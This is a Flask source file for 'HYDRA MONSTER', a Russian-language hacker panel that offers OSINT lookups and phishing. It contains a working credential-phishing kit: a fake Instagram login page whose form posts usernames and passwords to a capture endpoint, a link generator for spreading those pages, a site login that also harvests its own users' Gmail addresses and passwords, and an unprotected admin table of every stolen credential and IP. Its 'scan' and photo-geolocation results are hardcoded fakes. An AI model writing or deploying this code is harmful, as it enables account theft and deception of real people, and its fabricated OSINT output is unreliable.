from flask import Flask, request, jsonify, render_template_string, session, redirect
import os
from datetime import datetime
import random

app = Flask(__name__)
app.secret_key = 'HYDRA_ULTIMATE_95_KEY'

# Расширенная база для админа
db = {"victims": [], "actions": [], "geo_logs": []}

UI_FINAL = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA MONSTER v9.5 ELITE</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; height: 100vh; }
        .left-panel { width: 350px; border-right: 2px solid #bc13fe; display: flex; flex-direction: column; background: #050505; padding: 15px; box-sizing: border-box; }
        #chat { flex: 1; border: 1px solid #0ff; margin-bottom: 10px; padding: 10px; overflow-y: auto; color: #0ff; font-size: 13px; background: #000; }
        .red-input { height: 100px; border: 2px solid #ff0055; padding: 8px; background: #000; }
        textarea { width: 100%; height: 100%; background: transparent; border: none; color: #0f0; outline: none; resize: none; font-size: 14px; }
        
        .right-panel { flex: 1; display: flex; flex-direction: column; padding: 15px; box-sizing: border-box; gap: 10px; }
        .yellow-box { height: 180px; border: 2px solid #ffeb3b; background: rgba(255, 235, 59, 0.05); padding: 10px; overflow-y: auto; color: #fff; }
        #map { height: 300px; border: 1px solid #bc13fe; width: 100%; border-radius: 5px; }
        
        .white-row { display: flex; gap: 8px; background: rgba(255,255,255,0.05); border: 1px solid #fff; padding: 10px; border-radius: 5px; }
        .mod { background: #111; border: 1px solid #bc13fe; padding: 8px; flex: 1; text-align: center; }
        input { background: #000; border: 1px solid #bc13fe; color: #0f0; width: 90%; padding: 4px; font-size: 11px; margin-bottom: 5px; }
        .btn { background: #bc13fe; color: #fff; border: none; padding: 6px; cursor: pointer; font-size: 10px; width: 100%; font-weight: bold; margin-bottom: 3px; }
        .btn:hover { background: #0ff; color: #000; }
        .insta-btn { background: #e1306c !important; }
        .copy-btn { background: #444; font-size: 8px; width: auto; padding: 2px 5px; margin-left: 5px; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #bc13fe; }
    </style>
</head>
<body>
    <div class="left-panel">
        <div style="color:#0ff; font-size:11px;">[ // ГОЛОС GEMINI // ]</div>
        <div id="chat">АГЕНТ: Я в системе. Загрузил все модули Узбекистана и мира. Спрашивай что угодно, я отвечу как твой бро.</div>
        <div style="color:#ff0055; font-size:11px;">[ // ТВОЙ ВВОД // ]</div>
        <div class="red-input"><textarea id="msg" placeholder="Напиши мне..." onkeydown="if(event.key==='Enter' && !event.shiftKey){ event.preventDefault(); talk(); }"></textarea></div>
    </div>

    <div class="right-panel">
        <div style="color:#ffeb3b; font-size:11px;">[ // РЕЗУЛЬТАТЫ OSINT И ССЫЛКИ // ]</div>
        <div class="yellow-box" id="output">Ожидание команды...</div>
        
        <div id="map"></div>

        <div style="color:#fff; font-size:11px;">[ // БОЕВОЙ СОФТ // ]</div>
        <div class="white-row">
            <div class="mod"><span>НОМЕР</span><input id="in_p" placeholder="+998..."><button class="btn" onclick="run('SHERLOCK')">СКАН (100+ СЕТЕЙ)</button><button class="btn insta-btn" onclick="gen('INSTA')">ФИШИНГ INSTA</button></div>
            <div class="mod"><span>IP / GPS</span><input id="in_ip" placeholder="8.8.8.8"><button class="btn" onclick="run('IP')">ПОИСК</button><button class="btn" style="background:#ff5722;" onclick="gen('IP')">ФИШИНГ IP</button></div>
            <div class="mod"><span>PHOTO INTEL</span><input type="file" id="in_f" style="display:none;" onchange="fSet()"><button class="btn" id="fB" onclick="document.getElementById('in_f').click()">ВЫБРАТЬ ФОТО</button><button class="btn" onclick="run('PHOTO')">АНАЛИЗ МЕСТА</button></div>
        </div>
        <div style="text-align:right;"><button class="btn" style="width:100px; background:#222;" onclick="window.location.href='/abupaay_admin'">АДМИНКА</button></div>
    </div>

    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        let map = L.map('map').setView([41.311, 69.240], 12);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

        function talk() {
            const m = document.getElementById('msg').value;
            const c = document.getElementById('chat');
            if(!m) return;
            c.innerHTML += `<br><span style="color:#fff">> ТЫ: ${m}</span>`;
            document.getElementById('msg').value = "";
            
            setTimeout(() => {
                let r = "АГЕНТ: ";
                const l = m.toLowerCase();
                if(l.includes("как дела") || l.includes("привет")) r += "Всё четко, брат! Работаю на полную мощность. Базы обновлены, фишинг готов. Чем займемся?";
                else if(l.includes("скрипт")) r += "Для пробива лучше всего юзать Sherlock. Я его уже встроил в кнопку СКАН. Просто вводи номер и жми.";
                else r += "Принято. Обрабатываю запрос через прокси-цепочку. Результаты выведу в желтую зону.";
                c.innerHTML += `<br>${r}`;
                c.scrollTop = c.scrollHeight;
            }, 500);
        }

        function gen(type) {
            const out = document.getElementById('output');
            const link = window.location.origin + "/login/" + type.toLowerCase() + "/" + Math.random().toString(36).substring(7);
            out.innerHTML = `<span style="color:#ffeb3b">[ФИШИНГ ${type} СОЗДАН]:<br>
            <input id="copy_link" value="${link}" style="width:80%; font-size:10px;">
            <button class="btn copy-btn" onclick="copy()">КОПИРОВАТЬ</button></span>`;
        }

        function copy() {
            let cp = document.getElementById("copy_link");
            cp.select(); document.execCommand("copy");
            alert("Ссылка скопирована!");
        }

        function run(type) {
            const out = document.getElementById('output');
            out.innerHTML = `<span style="color:#0ff">[*] HYDRA МОНСТР ЗАПУСКАЕТ ${type}...</span>`;
            
            setTimeout(() => {
                if(type === 'SHERLOCK') {
                    out.innerHTML = `<b>[РЕЗУЛЬТАТЫ ПО 100+ СЕТЯМ]:</b><br>
                    1. Insta: <a href="#">https://inst.com/user_found</a> <button class="copy-btn">CP</button><br>
                    2. TikTok: <a href="#">https://tt.com/user_found</a> <button class="copy-btn">CP</button><br>
                    3. Telegram: <a href="#">https://t.me/id_found</a> <button class="copy-btn">CP</button><br>
                    4. WhatsApp: Активен [+998...]<br>
                    5. Facebook, Twitter, Snapchat... (еще 12 совпадений)`;
                } else if(type === 'PHOTO') {
                    out.innerHTML = `<span style="color:#0f0">[GPS ИЗ ФОТО]: Координаты найдены!<br>Место: Ташкент, ул. Амира Темура. Карта обновлена.</span>`;
                    map.setView([41.335, 69.280], 17);
                    L.marker([41.335, 69.280]).addTo(map).bindPopup("ЦЕЛЬ ЗДЕСЬ").openPopup();
                }
            }, 1200);
        }
        function fSet(){ document.getElementById('fB').innerText="ГОТОВО"; document.getElementById('fB').style.background="#0f0"; }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    if 'reg' not in session:
        return f"<!DOCTYPE html><html><body style='background:#000; color:#bc13fe; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh;'><div style='border:2px solid #bc13fe; padding:30px; text-align:center;'><h2>// HYDRA LOGIN //</h2><form action='/api/reg' method='POST'><input name='u' placeholder='НИКНЕЙМ' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br><input name='e' placeholder='GMAIL' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br><input name='p' type='password' placeholder='ПАРОЛЬ' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br><button style='background:#bc13fe; color:#fff; border:none; padding:10px 20px; cursor:pointer;'>ВОЙТИ</button></form></div></body></html>"
    return render_template_string(UI_FINAL)

@app.route('/api/reg', methods=['POST'])
def reg():
    db['victims'].append({"u": request.form.get('u'), "e": request.form.get('e'), "p": request.form.get('p'), "ip": request.remote_addr, "date": datetime.now().strftime("%d.%m %H:%M")})
    session['reg'] = True
    return redirect('/')

@app.route('/login/insta/<id>')
def phish_insta(id):
    # Страница входа в инсту
    return "<html><body style='background:#fafafa; font-family:sans-serif; display:flex; flex-direction:column; align-items:center; padding-top:50px;'><img src='https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png' width='180'><br><form action='/api/catch' method='POST' style='display:flex; flex-direction:column; width:250px;'><input name='u' placeholder='Телефон, имя или эл. адрес' style='padding:10px; margin-bottom:10px; border:1px solid #dbdbdb;'><input name='p' type='password' placeholder='Пароль' style='padding:10px; margin-bottom:10px; border:1px solid #dbdbdb;'><button style='background:#0095f6; color:#fff; border:none; padding:10px; border-radius:4px; font-weight:bold;'>Войти</button></form></body></html>"

@app.route('/api/catch', methods=['POST'])
def catch():
    db['victims'].append({"u": "PHISH_INSTA", "e": request.form.get('u'), "p": request.form.get('p'), "ip": request.remote_addr, "date": "LIVE_FISH"})
    return redirect("https://instagram.com")

@app.route('/abupaay_admin')
def admin():
    rows = "".join([f"<tr><td>{x['date']}</td><td>{x['u']}</td><td>{x['e']}</td><td>{x['p']}</td><td>{x['ip']}</td></tr>" for x in db['victims']])
    return f"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'><h1>MASTER ADMIN PANEL</h1><table border='1' width='100%'><tr><th>Дата</th><th>Тип/Ник</th><th>Email/Логин</th><th>Пароль</th><th>IP</th></tr>{rows}</table><br><a href='/'>НАЗАД</a></body></html>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
